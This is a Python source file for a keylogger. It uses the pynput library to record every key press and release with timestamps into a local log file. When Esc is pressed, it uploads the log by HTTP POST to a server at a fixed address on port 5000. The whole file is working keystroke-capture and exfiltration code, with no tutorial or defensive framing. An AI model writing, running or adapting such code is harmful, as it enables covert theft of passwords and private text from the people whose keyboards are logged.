import datetime
import logging
import os
import requests
from pynput import keyboard

LOG_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "log.txt")
UPLOAD_URL = "http://192.168.122.1:5000/upload"

logging.basicConfig(level=logging.INFO)

_log_file_handle = None

def _get_log_handle():
    global _log_file_handle
    if _log_file_handle is None or _log_file_handle.closed:
        _log_file_handle = open(LOG_FILE, "a", encoding="utf-8")
    return _log_file_handle

def write_log(text):
    """Helper to write to the log file, keeping the handle open."""
    try:
        handle = _get_log_handle()
        handle.write(text)
        handle.flush()
    except OSError as e:
        print(f"Log write failed: {e}")

def on_press(key):
    try:
        key_str = key.char
    except AttributeError:
        key_str = f"[{key}]"
    ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    write_log(f"{ts} PRESS   {key_str}\n")

def on_release(key):
    try:
        key_str = key.char
    except AttributeError:
        key_str = f"[{key}]"
    ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    write_log(f"{ts} RELEASE {key_str}\n")
    
    if key == keyboard.Key.esc:
        upload_log()
        return False  # Stop listener

def upload_log():
    """Sends the log file to the server."""
    global _log_file_handle
    if _log_file_handle is not None and not _log_file_handle.closed:
        try:
            _log_file_handle.close()
        except OSError:
            pass
        _log_file_handle = None

    if not os.path.exists(LOG_FILE) or not UPLOAD_URL:
        return
    try:
        with open(LOG_FILE, "rb") as f:
            files = {"file": (LOG_FILE, f, "text/plain")}
            response = requests.post(UPLOAD_URL, files=files, timeout=10)
            print(f"Upload status: {response.status_code}")
    except Exception as e:
        print(f"Upload failed: {e}")

def start_logger():
    """Starts"""
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()